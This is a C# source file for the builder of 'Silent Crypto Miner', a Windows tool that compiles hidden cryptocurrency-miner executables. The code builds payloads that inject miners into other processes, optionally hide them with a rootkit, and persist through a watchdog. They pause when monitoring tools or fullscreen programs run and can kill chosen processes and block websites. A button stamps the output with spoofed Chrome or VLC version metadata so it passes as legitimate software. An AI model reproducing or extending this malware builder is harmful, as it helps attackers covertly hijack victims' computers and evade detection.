using FormLocalization;
using FormSerialization;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace SilentCryptoMiner
{
    public partial class Builder
    {
        /* Silent Crypto Miner by Unam Sanctam https://github.com/UnamSanctam/SilentCryptoMiner */

        public Builder() => InitializeComponent();

        public AlgorithmSelection FormAS = new AlgorithmSelection();
        public AdvancedOptions FormAO = new AdvancedOptions();

        public Random rand = new Random();
        public byte[] watchdogdata = new byte[] { };
        public List<string> randomiCache = new List<string>();
        public string installPathCache = "AppData";
        public string currentLanguage = "en";
        
        public bool mineETH = false;
        public bool mineXMR = false;
        public bool xmrGPU = false;
        public string savePath;

        public List<string> findSet = new List<string>();
        public string watchdogID = "";

        public string CipherKey = "";
        public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
        public string UNAMIV = "UUCommandULineUU";

        public string builderVersion = "3.0.0";

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.language != "none") comboLanguage.Text = Properties.Settings.Default.language;
            Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            FormAS.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            FormAO.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            Codedom.F = this;
            FormAS.F = this;
            FormAO.F = this;
            randomiCache.Add("SilentCryptoMiner");
            formBuilder.Text += $" {builderVersion}";
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                if (BuildError(listMiners.Items.Count == 0, "Error: Atleast 1 miner required to build.")) return;
                if (BuildError(chkIcon.Checked && !File.Exists(txtIconPath.Text), "Error: Icon file could not be found.")) return;

                if (chkStartup.Checked)
                    foreach (var item in "/:*?\"<>|")
                        if (BuildError(txtStartupEntryName.Text.Contains(item), "Error: Startup option \"Entry Name\" contains any of the following illegal characters: /:*?\"<>|")) return;

                savePath = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
                if(savePath.Length > 0) workerBuild.RunWorkerAsync();
            }
            catch (Exception ex)
            {
                BuildError(true, "Error: An error occured while starting the build process: " + ex.Message);
            }
        }

        private void workerBuild_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            try
            {
                Invoke(new Action(() => txtLog.ResetText()));
                foreach (Control c in tabcontrolBuilder.TabPages)
                    if (c != tabBuild)
                        Invoke(new Action(() => c.Enabled = false));

                Invoke(new Action(() => txtStartDelay.Enabled = false));
                Invoke(new Action(() => btnBuild.Enabled = false));
                Invoke(new Action(() => btnBuild.Text = "Building..."));
                BuildLog("Starting...");

                xmrGPU = false;
                mineETH = false;
                mineXMR = false;

                CipherKey = Randomi(32);
                watchdogID = Randomi(rand.Next(8, 16));

                StringBuilder minerbuilder = new StringBuilder(Properties.Resources.miner);

                List<string> minerSet = new List<string>();
                List<string> watchdogSet = new List<string>();
                findSet = new List<string>();

                string savePathBase = Path.Combine(Path.GetDirectoryName(savePath), Path.GetFileNameWithoutExtension(savePath));

                BuildLog("Building miner sets...");
                foreach (dynamic miner in listMiners.Items)
                {
                    if (BuildError(miner.toggleIdle.Checked && OnlyDigits(miner.txtIdleWait.Text) && int.Parse(miner.txtIdleWait.Text) < 0, $"Error: Miner {miner.nid}: Idle Wait time must be a number and not negative.")) return;
                    StringBuilder argstr = new StringBuilder();
                    bool xmr = miner.GetType() == typeof(MinerXMR);

                    mineXMR = xmr || mineXMR;
                    mineETH = !xmr || mineETH;

                    if (xmr)
                        argstr.Append($"--algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : "")} --url={miner.txtPoolURL.Text} --user=\"{miner.txtPoolUsername.Text}\" --pass=\"{miner.txtPoolPassword.Text}\" --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace("%", "")))}");
                    else
                        argstr.Append($"--cinit-algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} --pool={formatETHUrl(miner)} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : "")} --cinit-max-gpu={Invoke(new Func<string>(() => miner.comboMaxGPU.Text.Replace("%", "")))}");

                    if (miner.chkRemoteConfig.Checked) argstr.Append($" --cinit-remote-config=\"{miner.txtRemoteConfig.Text}\"");

                    if (miner.toggleStealth.Checked)
                    {
                        if (miner.txtStealthTargets.Text.Length > 0) argstr.Append($" --cinit-stealth-targets=\"{miner.txtStealthTargets.Text}\"");
                        if (miner.toggleStealthFullscreen.Checked) argstr.Append($" --cinit-stealth-fullscreen");
                    }

                    if (miner.toggleProcessKiller.Checked && miner.txtKillTargets.Text.Length > 0) argstr.Append($" --cinit-kill-targets=\"{miner.txtKillTargets.Text}\"");

                    if (miner.chkAPI.Checked && miner.txtAPI.Text.Length > 0) argstr.Append($" --cinit-api=\"{miner.txtAPI.Text}\"");

                    if (!miner.txtAdvParam.Text.Contains("--cinit-version")) argstr.Append($" --cinit-version=\"{builderVersion}\"");

                    if (xmr)
                    {
                        if (miner.toggleNicehash.Checked) argstr.Append(" --nicehash");

                        if (!miner.toggleCPU.Checked) argstr.Append(" --no-cpu");

                        if (miner.toggleSSL.Checked) argstr.Append(" --tls");

                        if (miner.toggleGPU.Checked)
                        {
                            argstr.Append(" --cuda --opencl");
                            xmrGPU = true;
                        }

                        if (miner.toggleIdle.Checked) argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-cpu={Invoke(new Func<string>(() => miner.comboIdleCPU.Text.Replace("%", "")))}");
                    }
                    else
                    {
                        if (miner.toggleIdle.Checked) argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-gpu={Invoke(new Func<string>(() => miner.comboIdleGPU.Text.Replace("%", "")))}");
                    }
                    string minerid = Randomi(16);
                    argstr.Append($" --cinit-id=\"{minerid}\"");

                    string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
                    minerSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\"), AYW_OBFUSCATE(L\"{2}\") }}", xmr ? "xmr" : "eth", @$"Global\\{minerid}", @$"\\{(FormAO.toggleRootkit.Checked ? "dialer.exe" : injectionTarget)} {minerid} {Unamlib_Encrypt(argstr.ToString())}"));
                    watchdogSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\") }}", xmr ? "xmr" : "eth", @$"Global\\{minerid}"));
                    findSet.Add(minerid);
                }

                minerbuilder.Replace("$MINERSET", string.Join(",", minerSet));
                minerbuilder.Replace("$MINERCOUNT", minerSet.Count.ToString());

                string compilerPath = Path.Combine(Path.GetDirectoryName(savePath), "UCompilers");
                string versionPath = Path.Combine(compilerPath, "version.txt");
                if (Directory.Exists(compilerPath) && (!File.Exists(versionPath) || File.ReadAllText(versionPath) != "1")) Directory.Delete(compilerPath, true);

                if (!Directory.Exists(compilerPath))
                {
                    BuildLog("Extracting compilers... ");
                    using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
                        archive.ExtractToDirectory(compilerPath);
                }

                string filesPath = Path.Combine(Path.GetDirectoryName(savePath), "UFiles");
                if (Directory.Exists(filesPath))
                    Directory.Delete(filesPath, true);

                BuildLog("Extracting miner files... ");
                using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Files)))
                    archive.ExtractToDirectory(filesPath);

                if (chkStartup.Checked && toggleWatchdog.Checked)
                {
                    BuildLog("Compiling Watchdog...");
                    string watchdogpath = savePathBase + "-watchdog.exe";
                    string watchdogcode = Properties.Resources.watchdog.Replace("$WATCHDOGSET", string.Join(",", watchdogSet)).Replace("$MINERCOUNT", watchdogSet.Count.ToString());
                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(watchdogpath)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -O3 -s -o \"{Path.GetFileNameWithoutExtension(watchdogpath)}.exe\"", "", false, toggleAdministrator.Checked))
                    {
                        watchdogdata = File.ReadAllBytes(watchdogpath);
                        File.Delete(watchdogpath);
                    }
                    else
                    {
                        BuildError(true, "Error compiling Watchdog!");
                        Directory.Delete(filesPath, true);
                        return;
                    }
                }

                BuildLog("Converting resources...");
                StringBuilder resources = new StringBuilder();
                Codedom.CreateResource(resources, "resXMR", mineXMR ? Codedom.Cipher(Properties.Resources.xmrig, CipherKey) : new byte[] {});
                Codedom.CreateResource(resources, "resETH", mineETH ? Codedom.Cipher(Properties.Resources.ethminer, CipherKey) : new byte[] { });
                
                if (mineXMR) Codedom.CreateResource(resources, "resWR64", Codedom.Cipher(Properties.Resources.WinRing0x64, CipherKey));
                if (chkStartup.Checked && toggleWatchdog.Checked) Codedom.CreateResource(resources, "resWatchdog", Codedom.Cipher(watchdogdata, CipherKey));
                if (xmrGPU)
                {
                    Codedom.CreateResource(resources, "resddb64", Codedom.Cipher(Properties.Resources.ddb64, CipherKey));
                    Codedom.CreateResource(resources, "resnvrtc", Codedom.Cipher(Properties.Resources.nvrtc64_112_0, CipherKey));
                    Codedom.CreateResource(resources, "resnvrtc2", Codedom.Cipher(Properties.Resources.nvrtc_builtins64_112, CipherKey));
                }
                if (FormAO.toggleRootkit.Checked)
                    Codedom.CreateResource(resources, "resRootkit", Codedom.Cipher(Properties.Resources.rootkit_i, CipherKey));

                minerbuilder.Replace("$RESOURCES", resources.ToString());

                BuildLog("Compiling Miner...");
                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(savePathBase)}.cpp\" UFiles\\*.cpp UFiles\\Injection\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s resource.o -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -O3 -s -o \"{Path.GetFileNameWithoutExtension(savePathBase) + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
                {
                    BuildLog("Compiling Uninstaller...");
                    Codedom.UninstallerCompiler(savePathBase + "-uninstaller.exe");

                    BuildLog("Compiling Checker...");
                    Codedom.CheckerCompiler(savePathBase + "-checker.exe");

                    BuildLog("Done!");
                }
                else
                {
                    BuildError(true, "Error compiling Miner!");
                    Directory.Delete(filesPath, true);
                    return;
                }
                Directory.Delete(filesPath, true);
            }
            catch (Exception ex)
            {
                BuildError(true, "Error: An error occured while building the file: " + ex.Message);
                return;
            }
        }

        private void workerBuild_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            foreach (Control c in tabcontrolBuilder.TabPages)
                Invoke(new Action(() => c.Enabled = true));
            Invoke(new Action(() => txtStartDelay.Enabled = true));
            Invoke(new Action(() => btnBuild.Enabled = true));
            Invoke(new Action(() => btnBuild.Text = "Build"));
        }

        public string formatETHUrl(MinerETH miner) => Invoke(new Func<string>(() => miner.comboPoolScheme.Text.Split(' ')[0])) + "://" + "`" + miner.txtPoolUsername.Text + "`" + (string.IsNullOrEmpty(miner.txtPoolWorker.Text) ? "" : "." + miner.txtPoolWorker.Text) + (string.IsNullOrEmpty(miner.txtPoolPassowrd.Text) ? "" : ":" + miner.txtPoolPassowrd.Text) + (string.IsNullOrEmpty(miner.txtPoolUsername.Text) ? "" : "@") + miner.txtPoolURL.Text + (string.IsNullOrEmpty(miner.txtPoolData.Text) ? "" : "/" + miner.txtPoolData.Text);

        public string ToLiteral(string input)
        {
            var literal = new StringBuilder(input.Length + 2);
            foreach (var c in input)
            {
                switch (c)
                {
                    case '\"': literal.Append("\\\""); break;
                    case '\\': literal.Append(@"\\"); break;
                    case '\0': literal.Append(@"\u0000"); break;
                    case '\a': literal.Append(@"\a"); break;
                    case '\b': literal.Append(@"\b"); break;
                    case '\f': literal.Append(@"\f"); break;
                    case '\n': literal.Append(@"\n"); break;
                    case '\r': literal.Append(@"\r"); break;
                    case '\t': literal.Append(@"\t"); break;
                    case '\v': literal.Append(@"\v"); break;
                    default:
                        literal.Append(c);
                        break;
                }
            }
            return literal.ToString();
        }

        public bool BuildError(bool condition, string message)
        {
            if (condition)
            {
                MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return true;
            }
            return false;
        }

        public void BuildLog(string message) => Invoke(new Action(() => txtLog.Text += message + Environment.NewLine));

        public string Randomi(int length, bool useCache = true)
        {
            while (true)
            {
                string Chr = "asdfghjklqwertyuiopmnbvcxz";
                var sb = new StringBuilder();
                for (int i = 1, loopTo = length; i <= loopTo; i++)
                {
                    int idx = rand.Next(0, Chr.Length);
                    sb.Append(Chr.Substring(idx, 1));
                }

                if (useCache)
                {
                    if (!randomiCache.Contains(sb.ToString()))
                    {
                        randomiCache.Add(sb.ToString());                   
                        return sb.ToString();
                    }
                }
                else
                {
                    return sb.ToString();
                }
            }
        }

        public char[] CheckNonASCII(string text) => text.Where(c => c > 127).ToArray();

        bool OnlyDigits(string str)
        {
            foreach (char c in str)
            {
                if (c < '0' || c > '9')
                    return false;
            }
            return true;
        }

        public string Unamlib_Encrypt(string plainText)
        {
            var input = Encoding.UTF8.GetBytes(plainText);
            using (var mStream = new MemoryStream())
            {
                using (var cStream = new CryptoStream(mStream, new RijndaelManaged() { KeySize = 256, BlockSize = 128, Mode = CipherMode.CBC, Padding = PaddingMode.Zeros }.CreateEncryptor(Encoding.ASCII.GetBytes(UNAMKEY), Encoding.ASCII.GetBytes(UNAMIV)), CryptoStreamMode.Write))
                {
                    cStream.Write(input, 0, input.Length);
                    cStream.FlushFinalBlock();
                    cStream.Close();
                }
                return Convert.ToBase64String(mStream.ToArray());
            }
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
                return dialog.FileName;

            return "";
        }

        public string LoadDialog(string filter)
        {
            OpenFileDialog dialog = new OpenFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
                return dialog.FileName;

            return "";
        }

        private void btnAssemblyClone_Click(object sender, EventArgs e)
        {
            var o = new OpenFileDialog { Filter = "Executable |*.exe" };
            if (o.ShowDialog() == DialogResult.OK)
            {
                var info = FileVersionInfo.GetVersionInfo(o.FileName);
                try
                {
                    txtAssemblyTitle.Text = info.InternalName;
                    txtAssemblyDescription.Text = info.FileDescription;
                    txtAssemblyProduct.Text = info.CompanyName;
                    txtAssemblyCompany.Text = info.ProductName;
                    txtAssemblyCopyright.Text = info.LegalCopyright;
                    txtAssemblyTrademark.Text = info.LegalTrademarks;
                }
                catch {}

                string[] version;
                if (info.FileVersion.Contains(","))
                    version = info.FileVersion.Split(',');
                else
                    version = info.FileVersion.Split('.');

                try
                {
                    txtAssemblyVersion1.Text = version[0];
                    txtAssemblyVersion2.Text = version[1];
                    txtAssemblyVersion3.Text = version[2];
                    txtAssemblyVersion4.Text = version[3];
                }
                catch {}
            }
        }

        private void chkIcon_CheckedChanged(object sender)
        {
            chkIcon.Text = chkIcon.Checked ? "Enabled" : "Disabled";
            btnBrowseIcon.Enabled = chkIcon.Checked;
        }

        private void chkStartup_CheckedChanged(object sender)
        {
            chkStartup.Text = chkStartup.Checked ? "Enabled" : "Disabled";
            foreach (Control c in tabStartup.Controls)
                if (c is not MephCheckBox && c is not Label)
                    c.Enabled = chkStartup.Checked;

            InstallPathCheck();
        }

        private void chkAssembly_CheckedChanged(object sender)
        {
            chkAssembly.Text = chkAssembly.Checked ? "Enabled" : "Disabled";
            foreach (Control c in tabAssembly.Controls)
                if (c is not MephCheckBox && c is not Label)
                    c.Enabled = chkAssembly.Checked;
        }

        private void btnAssemblyRandom_Click(object sender, EventArgs e)
        {
            try
            {
                switch (rand.Next(2))
                {
                    case 0:
                        {
                            txtAssemblyTitle.Text = "chrome.exe";
                            txtAssemblyDescription.Text = "Google Chrome";
                            txtAssemblyProduct.Text = "Google Chrome";
                            txtAssemblyCompany.Text = "Google Inc.";
                            txtAssemblyCopyright.Text = "Copyright 2017 Google Inc. All rights reserved.";
                            txtAssemblyTrademark.Text = "";
                            txtAssemblyVersion1.Text = "70";
                            txtAssemblyVersion2.Text = "0";
                            txtAssemblyVersion3.Text = "3538";
                            txtAssemblyVersion4.Text = "110";
                            break;
                        }

                    case 1:
                        {
                            txtAssemblyTitle.Text = "vlc";
                            txtAssemblyDescription.Text = "VLC media player";
                            txtAssemblyProduct.Text = "VLC media player";
                            txtAssemblyCompany.Text = "VideoLAN";
                            txtAssemblyCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors";
                            txtAssemblyTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN";
                            txtAssemblyVersion1.Text = "3";
                            txtAssemblyVersion2.Text = "0";
                            txtAssemblyVersion3.Text = "3";
                            txtAssemblyVersion4.Text = "0";
                            break;
                        }
                }
            }
            catch {}
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            try
            {
                var o = new OpenFileDialog();
                o.Filter = "Icon |*.ico";
                if (o.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = o.FileName;
                    picIcon.ImageLocation = o.FileName;
                }
                else
                {
                    txtIconPath.Text = "";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void labelGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner");

        private void labelWiki_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner/wiki");

        private void btnAdvancedOptions_Click(object sender, EventArgs e) => FormAO.Show();

        private void btnMinerAdd_Click(object sender, EventArgs e) => FormAS.Show();

        private void btnMinerEdit_Click(object sender, EventArgs e)
        {
            if (listMiners.SelectedItem != null) ((dynamic)listMiners.SelectedItem).Show();
        }

        private void btnMinerRemove_Click(object sender, EventArgs e)
        {
            if (listMiners.SelectedItem != null)
            {
                ((dynamic)listMiners.SelectedItem).Hide();
                listMiners.Items.Remove(listMiners.SelectedItem);
                ReloadMinerList();
            }
        }

        public void ReloadMinerList()
        {
            int count = listMiners.Items.Count;
            for (int i = 0; i < count; i++)
            {
                ((dynamic)listMiners.Items[i]).nid = i;
                ((dynamic)listMiners.Items[i]).F = this;
                listMiners.Items[i] = listMiners.Items[i];
            }
        }

        public void TranslateForms(bool selected)
        {
            Dictionary<string, string> languages = new Dictionary<string, string>() { { "English", "en" }, { "Swedish", "sv" }, { "Polish", "pl" }, { "Spanish", "es" }, { "Russian", "ru" }, { "French", "fr" } };
            currentLanguage = languages[comboLanguage.Text];

            var list = new List<Control>() { this, FormAO, FormAS };
            foreach(var item in listMiners.Items)
                list.Add((dynamic)item);

            FormLocalizer.TranslateControls(list, Properties.Resources.LocalizedControls, currentLanguage, "en");
            
            if (selected)
            {
                Properties.Settings.Default.language = comboLanguage.Text;
                Properties.Settings.Default.Save();
            }
        }

        private void btnSaveState_Click(object sender, EventArgs e)
        {
            string savepath = SaveDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(savepath))
                FormSerializer.Serialise(new List<Control>() { this, FormAO }, savepath);
        }

        private void btnLoadState_Click(object sender, EventArgs e)
        {
            string loadpath = LoadDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(loadpath))
            {
                try
                {
                    FormSerializer.Deserialise(new List<Control>() { this, FormAO }, loadpath);
                    ReloadMinerList();
                    InstallPathCheck();
                    TranslateForms(false);
                    try
                    {
                        if (File.Exists(txtIconPath.Text))
                            picIcon.ImageLocation = txtIconPath.Text;
                    }
                    catch { }
                } 
                catch {
                    MessageBox.Show("Could not parse the configuration file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        public void InstallPathCheck()
        {
            bool isProgramFiles = txtStartupPath.Text == "Program Files";
            if (toggleAdministrator.Checked && toggleRunSystem.Checked)
            {
                if (!isProgramFiles)
                    installPathCache = txtStartupPath.Text;

                txtStartupPath.Items[txtStartupPath.SelectedIndex] = "Program Files";
                txtStartupPath.Enabled = false;
            }
            else if(isProgramFiles)
            {
                txtStartupPath.Items[txtStartupPath.SelectedIndex] = installPathCache;
                txtStartupPath.Enabled = chkStartup.Checked;
            }
        }

        private void chkBlockWebsites_CheckedChanged(object sender) => txtBlockWebsites.Enabled = chkBlockWebsites.Checked;

        private void toggleAdministrator_CheckedChanged(object sender) => InstallPathCheck();

        private void toggleRunSystem_CheckedChanged(object sender) => InstallPathCheck();

        private void comboLanguage_SelectedIndexChanged(object sender, EventArgs e) => TranslateForms(true);
    }
}